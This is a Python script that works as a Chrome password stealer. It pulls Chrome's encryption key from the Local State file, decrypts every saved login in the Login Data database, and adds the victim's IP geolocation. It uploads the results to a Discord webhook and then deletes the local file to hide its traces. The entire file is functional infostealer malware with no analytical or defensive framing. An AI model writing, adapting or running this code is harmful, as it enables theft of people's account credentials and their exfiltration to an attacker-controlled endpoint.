import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import requests
import json 
from urllib.request import urlopen


def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"

def write_credentials_to_file(credentials):
    file_name = os.path.join(os.environ['LOCALAPPDATA'], "Temp", os.environ['USERNAME'] + "_credentials.txt")
    with open(file_name, "a") as f:
        for cred in credentials:
            f.write(f"URL: {cred[0]}\nUser Name: {cred[1]}\nPassword: {cred[2]}\n{'*' * 50}\n")
    
    # Obtenir les données de localisation
    localisation_data = get_localisation()

    # Écrire les données de localisation à la fin du fichier
    with open(file_name, "a") as f:
        f.write("\n\nLocalisation Data:\n")
        for key, value in localisation_data.items():
            f.write(f"{key}: {value}\n")

def get_localisation():
    url='http://ipinfo.io/json'
    response = urlopen(url)
    data = json.load(response)

    return data

def send_file_to_discord_webhook():
    webhook_url = "WEBHOOK_LINK"
    file_name = os.path.join(os.environ['LOCALAPPDATA'], "Temp", os.environ['USERNAME'] + "_credentials.txt")
    write_credentials_to_file(credentials)
    with open(file_name, "rb") as f:
        files = {"file": f}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print("File sent to Discord successfully!")
        else:
            print("Failed to send file to Discord. Status code:", response.status_code)
    delete_file()

def delete_file():
    file_name = os.path.join(os.environ['LOCALAPPDATA'], "Temp", os.environ['USERNAME'] + "_credentials.txt")
    os.remove(file_name)
    

master_key = get_master_key()
login_db = os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\default\Login Data'
shutil.copy2(login_db, "Loginvault.db") #temp login data file while chrome is running
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
credentials = []
try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)
        if len(username) > 0:
            credentials.append((url, username, decrypted_password))
except Exception as e:
    pass
cursor.close()
conn.close()
try:
    os.remove("Loginvault.db")
except Exception as e:
    pass

if credentials:
    write_credentials_to_file(credentials)
    send_file_to_discord_webhook()
else:
    print("No credentials.")
